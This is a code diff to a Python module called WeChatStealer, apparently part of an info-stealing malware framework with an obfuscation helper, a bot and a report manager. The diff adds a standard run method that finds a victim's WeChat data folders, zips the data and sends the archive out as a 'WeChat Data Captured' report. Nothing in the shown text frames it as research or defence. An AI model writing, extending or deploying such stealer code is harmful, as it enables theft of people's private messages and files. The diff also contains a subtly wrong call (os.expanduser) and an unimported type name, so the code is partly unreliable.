@@ -3,15 +3,37 @@ import shutil
 import zipfile
 import time
 from core.obfuscation import decrypt_string
-class WeChatStealer:
-    def __init__(self, temp_dir):
-        self.temp_dir = temp_dir
-        self.user_profile = os.path.expanduser('~')
+from core.base import BaseModule
+
+class WeChatStealer(BaseModule):
+    def __init__(self, bot=None, report_manager=None, temp_dir=None):
+        super().__init__(bot, report_manager, temp_dir)
+        self.user_profile = os.expanduser('~') if hasattr(os, 'expanduser') else os.path.expanduser('~')
         self.wechat_paths = [
             os.path.join(self.user_profile, 'Documents', 'WeChat Files'),
             os.path.join(self.user_profile, 'AppData', 'Roaming', 'Tencent', 'WeChat'),
             os.path.join(self.user_profile, 'AppData', 'Local', 'Tencent', 'WeChat')
         ]
+        self.last_run_size = 0.0
+
+    def run(self) -> bool:
+        """A-04: Standardized run method."""
+        try:
+            self.log("Starting WeChat data extraction...")
+            result = self.steal_data()
+            self.last_run_size = result.get('size_mb', 0.0)
+            
+            if result.get('zip_path') and self.report_manager:
+                self.log(f"WeChat data captured ({self.last_run_size:.2f} MB). Sending report...")
+                self.report_manager.send_output_zip(result['zip_path'], "📟 WeChat Data Captured")
+            
+            return True if result.get('found') else False
+        except Exception as e:
+            self.log(f"WeChat extraction failed: {e}")
+            return False
+
+    def get_stats(self) -> Dict[str, int]:
+        return {"size_mb": int(self.last_run_size)}
     def steal_data(self):
         result = {'found': False, 'size_mb': 0.0, 'zip_path': None}
         found_path = None
